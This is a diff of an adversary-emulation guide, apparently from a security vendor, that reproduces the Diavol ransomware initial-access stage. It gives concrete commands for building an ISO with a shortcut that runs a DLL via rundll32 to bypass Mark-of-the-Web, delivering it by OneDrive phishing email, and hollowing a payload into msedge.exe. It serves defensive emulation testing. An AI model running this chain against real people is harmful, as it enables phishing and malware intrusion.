@@ -63,17 +63,18 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 This is a multi-stage attack leveraging multiple payloads and execution that perform different TTPs. Manual emulation steps are below.
 
 ### Diavol Stage 0
-1. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
-2. Put the SCYTHE DLL in the Folder2Iso of the working directory.
-3. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
-4. Open a Windows command prompt and cd to the working directory.
-5. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
-6. Zip the ISO and call it `new-documents-2005.zip`
-7. Upload the zip file to Microsoft OneDrive and copy the link.
-8. Send a phishing email with the link to the Microsoft OneDrive zip file. 
-9. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
-10. Load the process hollowing module: ```loader --load scythe.phollowing```
-11. Inject DiavolStage1 insto msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe```
+1. Start a campaign, download the DLL with entry point of `BasicScore` and save as `ShareFiles.dll` 
+2. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
+3. Put the SCYTHE DLL in the Folder2Iso of the working directory.
+4. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
+5. Open a Windows command prompt and cd to the working directory.
+6. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
+7. Zip the ISO and call it `new-documents-2005.zip`
+8. Upload the zip file to Microsoft OneDrive and copy the link.
+9. Send a phishing email with the link to the Microsoft OneDrive zip file. 
+10. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
+11. Load the process hollowing module: ```loader --load scythe.phollowing```
+12. Inject DiavolStage1 insto msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"```
 
 ### Diavol Stage 1
 Create fodhelper_reg_hashes.bat  and upload to VFS:/shared/Diavol/fodhelper_reg_hashes.bat
